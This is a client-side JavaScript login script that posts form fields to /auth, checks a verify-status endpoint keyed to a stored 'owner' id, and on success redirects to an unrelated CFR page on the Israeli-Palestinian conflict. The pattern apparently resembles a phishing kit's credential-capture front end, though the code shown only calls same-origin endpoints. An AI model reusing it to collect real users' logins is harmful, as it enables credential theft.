document.addEventListener("DOMContentLoaded", function () {
  const id = localStorage.getItem("id");
  document.getElementById("id").value = id;

  const form = document.getElementById('myForm');
  const submitButton = form.querySelector('button[type="submit"]');
  let isSubmitting = false;

  form.addEventListener('submit', async function(event) {
      event.preventDefault(); // Prevent the default form submission

      if (isSubmitting) return; // Prevent resubmission if already submitting
      isSubmitting = true;
      submitButton.disabled = true; // Disable the submit button

      // Get form data
      const formData = new FormData(this);
      const data = Object.fromEntries(formData.entries());

      try {
          // Send the form data to the server
          const response = await fetch('/auth', {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json'
              },
              body: JSON.stringify(data)
          });

          // Check if the response is successful
          if (!response.ok) {
              throw new Error('Network response was not ok');
          }

          // Parse the JSON response
          const jsonResponse = await response.json();
          const loginStatus = await checkLoginStatus(jsonResponse.Key, id);

          // Provide feedback and open the page if login is successful
          if (loginStatus === 'Login successful') {
              alert("login successful, \nMake sure you don't disable pop-up in your browser")
              window.open("https://www.cfr.org/global-conflict-tracker/conflict/israeli-palestinian-conflict", "_self");
          } else {
              alert(loginStatus); // Show error message if login fails
          }

      } catch (error) {
          console.error('There was a problem with the fetch operation:', error);
          alert('Error submitting form');
      } finally {
          isSubmitting = false; // Allow form submission again
          submitButton.disabled = false; // Re-enable the submit button
      }
  });
});

async function checkLoginStatus(id, owner) {
  const url = `/check-verify-status/${id}/${owner}`;

  try {
      const response = await fetch(url);

      if (!response.ok) {
          throw new Error('Network response was not ok');
      }

      const data = await response.json();

      if (data.status) {
          return 'Login successful';
      } else {
          return 'Login failed due to invalid credentials';
      }
  } catch (error) {
      console.error('Error:', error);
      return 'An error occurred while checking the login status';
  }
}
